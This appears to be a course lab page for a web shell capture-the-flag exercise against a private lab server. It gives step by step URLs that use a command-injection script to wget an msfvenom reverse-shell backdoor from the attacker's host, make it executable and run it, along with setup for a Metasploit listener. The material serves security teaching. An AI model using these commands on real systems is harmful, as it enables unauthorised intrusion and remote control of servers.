---
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Web Shells CTF

## Web Shells

This will be in the form of a Capture the Flag based on everything you’ve learned so I’ll provide hints only.

### Preparation

Put your Kali workstation on your **WAN** segment. That is the only host you’ll need for this lab.

The Victim IP is: 10.0.16.97

### Starting the CTF

You’ll first scan the web server looking for vulnerable web applications. The program **nikto** is a well-known application scanner. It ONLY scans to see if the application is present. Keep in mind, that it will scan for known application filenames. You may have a custom script named: info.php but isn’t vulnerable. **Locate a tutorial showing how to perform a basic scan of a web server using nikto**. Remember to use the Victim IP above ONLY.

If a file shows up that is ‘vulnerable’ you’ll see something like “This might be interesting…” The filename aka “script” will be on the left of that line. Look for something like:

**OSVBD-1234: /filename.php**

The “/filename.php” is what you want to use for the rest of the CTF.

**NOTE: THE REAL SCRIPT IS NOT filename.php.**

When you find the script name, it is vulnerable to a remote command execution (RCE) attack. An RCE is dangerous because anyone on the internet (if the script or application is publicly accessible) can exploit it. Exploit means to take advantage of a weakness. A weakness is a system or application is called a vulnerability. Essentially, they can execute any command with the permission of the user they compromised. In this case, the web server user.

Open your firefox browser on Kali. Browse to the victim IP and add the script name. The vulnerability is taken advantage of by running:

[http://10.0.16.97/filename.php?cmd=ip](http://10.0.16.97/filename.php?cmd=ip) a

**NOTE: filename.php is NOT the real script name. It is the script found in the nikto scan**.

That will show the IP information for the victim server. It will look weird so right-click inside your browser and select “View Page Source.” See how pretty it is now?

Essentially, the victim server script is the same as you typing on the command line on your Kali system. The victim serve is running Linux and the script is allowing you to run any command that the web user can run. SEE THE PROBLEM?

### Create a backdoor

Use msfvenom to create a LINUX backdoor.

Find a tutorial that shows how to use msfvenom to create a Linux backdoor(also in the tutorial you’ll see: -f elf) as the type of the file to create. When you save the backdoor, be sure to name it with your first and last name so you can get your reward. For example, I would name the file: > duane.dunston.bin

**NOTE: Pay close attention to PAYLOAD used with msfvenom. The payload is the syntax after the “-p” command with msfvenom. IT IS IMPORTANT. If you used:**

**-p linux/x64/shell\_reverse\_tcp**

**then you will need that information for later.**

After you create the backdoor, copy the file to your web root on Kali and be sure your web server is started.

### Download the backdoor

**PLEASE DO NOT DELETE ANYONE’S BACKDOOR**

Back in Firefox, now that you can run arbitrary commands you will download the backdoor. In firefox, type (Below is all one line):

[http://10.0.16.97/filename.php?cmd=wget](http://10.0.16.97/filename.php?cmd=wget) http://YOUR\_KALI\_IP/first.lastname.bin -O /tmp/first.lastname.bin

**wget** is a commandline version of a web browser. It is for downloading files primarily. -O specifies the filename to save the downloaded into.

Check to see if the file was downloaded:

[http://10.0.16.97/filename.php?cmd=ls](http://10.0.16.97/filename.php?cmd=ls) -l /tmp/first.lastname.bin

### Make the backdoor executable:

[http://10.0.16.97/filename.php?cmd=chmod](http://10.0.16.97/filename.php?cmd=chmod) 755 /tmp/first.lastname.bin

Be sure that command worked:

[http://10.0.16.97/filename.php?cmd=ls](http://10.0.16.97/filename.php?cmd=ls) -l /tmp/first.lastname.bin

You’ll see in the output: **rwx-r-x-r-x**

Those ‘x’ bits mean the file is executable.

### Creating a Listener

Open a terminal and start metasploit

Create a listener:

1. Set the LHOST to your Kali IP
2. Set the PORT based on the msfvenom command
3. Set the PAYLOAD to the exact payload used in the msfvenom command.
4. Check that all your options are set correctly.
5. Run: exploit

### Switch back to your web browser

Type in the URL below to execute the backdoor:

[http://10.0.16.97/filename.php?cmd=/tmp/first.lastname.bin](http://10.0.16.97/filename.php?cmd=/tmp/first.lastname.bin)

Wait a few moments to see if the connection hangs, look at the tab and you’ll see a spinning circle. If you do not see it, then double-check all of your settings above. It is supposed to hang because it is being used to create a shell.

Look at your Kali terminal and see if you have a connection.

**NOTE: Linux will not give you a command prompt. It will be a blank screen, however, you can still type commands**

Run the command below within the same Metasploit window:

**ps -ef**

Which will list all running processes on the system. Look for your backdoor on the right of the screen. You’ll see it because it will have your first and last name.

Then to capture the flag, type:

**hostname**

and you should see “IM\_HACKED”

**SUBMISSION:**

Take a screenshot of the **ps** output and annotated your backdoor.\
Take a screenshot of the ‘hostname’ output and annotate it.
